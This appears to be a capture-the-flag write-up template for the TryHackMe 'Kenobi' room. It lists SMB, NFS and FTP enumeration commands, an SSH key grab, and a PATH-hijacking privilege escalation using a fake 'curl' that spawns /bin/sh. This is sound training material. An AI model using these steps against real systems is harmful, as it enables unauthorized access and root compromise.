# Kenobi - Write-Up

## Room Information

| Field          | Value                                 |
| -------------- | ------------------------------------- |
| Room           | Kenobi                                |
| Platform       | TryHackMe                             |
| Difficulty     | Easy                                  |
| Date Completed | YYYY-MM-DD                            |
| Tags           | SMB, NFS, Linux, Privilege Escalation |

---

# Objective

Gain access to the target system and escalate privileges to root.

---

# Attack Path Summary

1. Enumerate network services.
2. Discover SMB shares.
3. Retrieve an SSH private key.
4. Gain user access via SSH.
5. Enumerate SUID binaries.
6. Abuse a vulnerable SUID binary.
7. Obtain root access.

---

# Reconnaissance

## Nmap Scan

### Command

```bash
nmap -sC -sV -p- -oN nmap.txt <TARGET_IP>
```

### Findings

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |
| 111  | rpcbind |
| 139  | SMB     |
| 445  | SMB     |
| 2049 | NFS     |

### Screenshot

![Nmap](screenshots/01_nmap.png)

### Notes

The presence of both SMB and NFS is highly interesting.

---

# SMB Enumeration

## Enumerate Shares

```bash
smbclient -L //<TARGET_IP> -N
```

### Discovery

An anonymous share is available.

### Screenshot

![SMB Enumeration](screenshots/02_smb_enum.png)

---

## Access Share

```bash
smbclient //<TARGET_IP>/anonymous -N
```

### Files Found

Interesting log files are present.

```bash
ls
```

```bash
get log.txt
```

### Screenshot

![Anonymous Share](screenshots/02_smb_enum.png)

---

# Information Gathering

## Review Log File

```bash
cat log.txt
```

### Discovery

The log references SSH key generation and storage paths.

### Notes

This information will become useful later.

---

# NFS Enumeration

## List Available Mounts

```bash
showmount -e <TARGET_IP>
```

### Screenshot

![NFS Enumeration](screenshots/03_nfs_enum.png)

### Discovery

An exported directory is accessible.

---

## Mount Share

```bash
mkdir /tmp/kenobi
```

```bash
sudo mount -t nfs <TARGET_IP>:/var /tmp/kenobi
```

### Verification

```bash
ls -la /tmp/kenobi
```

---

# Obtaining the SSH Key

## FTP Enumeration

Connect to FTP.

```bash
ftp <TARGET_IP>
```

### Discovery

The FTP service is vulnerable to a known file-copy technique.

---

## Copy SSH Key

Using the discovered paths from the SMB logs, copy the SSH private key into the mounted NFS share.

(Insert exact commands used during the room.)

### Result

The private SSH key becomes accessible through the mounted share.

### Screenshot

![SSH Key](screenshots/04_ssh_key.png)

---

## Prepare Key

```bash
chmod 600 id_rsa
```

---

# Initial Access

## SSH Login

```bash
ssh -i id_rsa kenobi@<TARGET_IP>
```

### Verification

```bash
whoami
```

Expected:

```text
kenobi
```

### Screenshot

![SSH Access](screenshots/05_ssh_access.png)

---

# Local Enumeration

## User Information

```bash
id
```

## Kernel Information

```bash
uname -a
```

## Sudo Permissions

```bash
sudo -l
```

---

# SUID Enumeration

## Find SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Discovery

An unusual SUID binary is present.

### Screenshot

![SUID Enumeration](screenshots/06_suid_enum.png)

---

# Privilege Escalation

## Analyze Binary

```bash
strings <binary>
```

### Observation

The binary executes another command using PATH lookup.

---

## PATH Hijacking

Create a malicious executable.

```bash
echo "/bin/sh" > curl
```

```bash
chmod +x curl
```

Update PATH.

```bash
export PATH=/tmp:$PATH
```

Execute the vulnerable binary.

```bash
<binary>
```

### Result

Root shell obtained.

### Verification

```bash
whoami
```

Expected:

```text
root
```

### Screenshot

![Root Shell](screenshots/07_root_shell.png)

---

# Root Flag

## Locate

```bash
find / -name user.txt 2>/dev/null
```

```bash
find / -name root.txt 2>/dev/null
```

### Read

```bash
cat <flag_file>
```

### Screenshot

![Flags](screenshots/08_flags.png)

---

# Commands Reference

```bash
nmap -sC -sV -p-

smbclient -L //<TARGET_IP> -N

smbclient //<TARGET_IP>/anonymous -N

showmount -e <TARGET_IP>

mount -t nfs

ftp <TARGET_IP>

ssh -i id_rsa

find / -perm -4000 -type f 2>/dev/null

strings <binary>
```

---

# Lessons Learned

## Technical

* Enumerate every exposed service.
* SMB shares often leak sensitive information.
* NFS misconfigurations can expose critical files.
* SSH private keys should be protected carefully.
* PATH hijacking is a common Linux privilege escalation technique.

## Methodology

1. Nmap
2. SMB Enumeration
3. NFS Enumeration
4. FTP Investigation
5. SSH Access
6. Local Enumeration
7. SUID Enumeration
8. Privilege Escalation

---

# MITRE ATT&CK Mapping

| Phase                | Technique                                      |
| -------------------- | ---------------------------------------------- |
| Discovery            | Network Service Discovery                      |
| Credential Access    | Unsecured Credentials                          |
| Initial Access       | Valid Accounts                                 |
| Privilege Escalation | Path Interception by PATH Environment Variable |
| Collection           | Data from Local System                         |

---

# Conclusion

Through systematic enumeration of SMB, FTP, and NFS services, sensitive information was discovered that enabled retrieval of an SSH private key. After gaining user access, a vulnerable SUID binary was exploited through PATH hijacking, resulting in full root compromise of the system.
